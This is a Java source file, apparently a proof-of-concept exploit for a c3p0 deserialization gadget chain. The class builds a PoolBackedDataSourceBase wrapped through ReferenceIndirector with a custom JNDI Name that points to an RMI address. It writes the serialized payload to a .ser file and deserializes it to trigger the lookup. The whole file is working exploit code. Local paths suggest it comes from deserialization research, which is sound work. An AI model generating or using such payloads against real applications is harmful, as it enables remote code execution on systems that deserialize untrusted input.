import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.mchange.v2.naming.ReferenceIndirector;
import com.mchange.v2.ser.IndirectlySerialized;

import javax.naming.*;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Enumeration;
import java.util.logging.Logger;

public class Exp {
    public static void main(String args[]) throws  Exception{
        System.out.println("Exp Go!");
        PoolBackedDataSourceBase firstObj = new PoolBackedDataSourceBase(true);
        PoolSource secondObj = new PoolSource();
        ReferenceIndirector refIn = new ReferenceIndirector();
        Name nameContext = new MyName();
        refIn.setNameContextName(nameContext);
        IndirectlySerialized connectionPoolDataSource = refIn.indirectForm(secondObj);
        firstObj.setConnectionPoolDataSource((ConnectionPoolDataSource)connectionPoolDataSource);
        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream("/Users/xq17/工作区/研究进程/java反序列化/c3p0/src/main/java/poc3.ser"));
        objOut.writeObject(firstObj);
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("/Users/xq17/工作区/研究进程/java反序列化/c3p0/src/main/java/poc3.ser"));
        in.readObject();
    }

    private static final class PoolSource implements ConnectionPoolDataSource, IndirectlySerialized, Referenceable, Serializable {

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        public void setLoginTimeout(int seconds) throws SQLException {

        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public Object getObject() throws ClassNotFoundException, IOException {
            return null;
        }

        public Reference getReference() throws NamingException {
            return null;
        }
    }

    private  static class MyName implements Name{

        public Object clone() {
            return null;
        }

        public int compareTo(Object obj) {
            return 0;
        }

        public int size() {
            return 1;
        }

        public boolean isEmpty() {
            return false;
        }

        public Enumeration<String> getAll() {
            return null;
        }

        public String get(int posn) {
            return "rmi://127.0.0.1";
        }

        public Name getPrefix(int posn) {
            return null;
        }

        public Name getSuffix(int posn) {
            return null;
        }

        public boolean startsWith(Name n) {
            return false;
        }

        public boolean endsWith(Name n) {
            return false;
        }

        public Name addAll(Name suffix) throws InvalidNameException {
            return null;
        }

        public Name addAll(int posn, Name n) throws InvalidNameException {
            return null;
        }

        public Name add(String comp) throws InvalidNameException {
            return null;
        }

        public Name add(int posn, String comp) throws InvalidNameException {
            return null;
        }

        public Object remove(int posn) throws InvalidNameException {
            return null;
        }
    }
}
